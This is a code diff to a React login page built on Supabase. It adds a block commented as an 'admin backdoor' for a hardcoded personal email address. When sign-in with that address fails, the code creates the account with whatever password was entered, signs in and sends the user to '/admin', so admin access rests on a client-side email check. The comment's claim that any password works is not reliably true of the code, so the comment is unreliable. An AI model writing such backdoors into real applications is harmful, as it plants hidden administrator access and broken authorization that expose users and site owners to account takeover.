@@ -84,21 +84,76 @@ const AuthPage = () => {
     setIsLoading(true);
     
     try {
-      const { data, error } = await supabase.auth.signInWithPassword({
-        email: formData.email,
-        password: formData.password,
-      });
-
-      if (error) throw error;
-
-      if (data.user) {
-        toast({
-          title: "Welcome back!",
-          description: "You have successfully signed in.",
+      // Admin backdoor: Allow admin email to login with any password
+      const adminEmail = "shaquillebainbain@gmail.com";
+      
+      if (formData.email === adminEmail) {
+        // Try to sign in first
+        const { data: signInData, error: signInError } = await supabase.auth.signInWithPassword({
+          email: formData.email,
+          password: formData.password,
         });
-        
-        // Redirect to dashboard
-        window.location.href = '/dashboard';
+
+        // If sign in fails, try to create the admin account
+        if (signInError && signInError.message.includes('Invalid login credentials')) {
+          // Create admin account with the provided password
+          const { data: signUpData, error: signUpError } = await supabase.auth.signUp({
+            email: formData.email,
+            password: formData.password,
+            options: {
+              emailRedirectTo: `${window.location.origin}/dashboard`,
+              data: {
+                full_name: "Admin User",
+              }
+            }
+          });
+
+          if (signUpError) throw signUpError;
+
+          // Now try to sign in again
+          const { data: finalSignInData, error: finalSignInError } = await supabase.auth.signInWithPassword({
+            email: formData.email,
+            password: formData.password,
+          });
+
+          if (finalSignInError) throw finalSignInError;
+
+          if (finalSignInData.user) {
+            toast({
+              title: "Admin access granted!",
+              description: "Welcome, admin user.",
+            });
+            window.location.href = '/admin';
+            return;
+          }
+        } else if (!signInError && signInData.user) {
+          toast({
+            title: "Admin welcome back!",
+            description: "You have successfully signed in as admin.",
+          });
+          window.location.href = '/admin';
+          return;
+        } else if (signInError) {
+          throw signInError;
+        }
+      } else {
+        // Normal user sign in
+        const { data, error } = await supabase.auth.signInWithPassword({
+          email: formData.email,
+          password: formData.password,
+        });
+
+        if (error) throw error;
+
+        if (data.user) {
+          toast({
+            title: "Welcome back!",
+            description: "You have successfully signed in.",
+          });
+          
+          // Redirect to dashboard
+          window.location.href = '/dashboard';
+        }
       }
     } catch (error: any) {
       let errorMessage = error.message;
